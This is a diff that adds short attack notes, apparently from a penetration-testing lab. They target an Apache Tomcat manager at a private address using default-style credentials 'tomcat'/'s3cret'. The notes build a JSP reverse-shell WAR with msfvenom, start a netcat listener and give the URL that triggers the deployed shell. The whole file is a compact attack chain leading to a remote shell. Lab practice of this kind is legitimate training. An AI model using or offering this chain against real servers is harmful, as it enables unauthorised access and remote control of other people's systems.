@@ -1,0 +1,9 @@
+<user username="tomcat" password="s3cret" roles="manager-gui"/>
+
+http://10.11.1.209:8080/manager
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > rev.war
+
+nc -lnvp PORT
+
+http://10.11.1.209:8080/rev
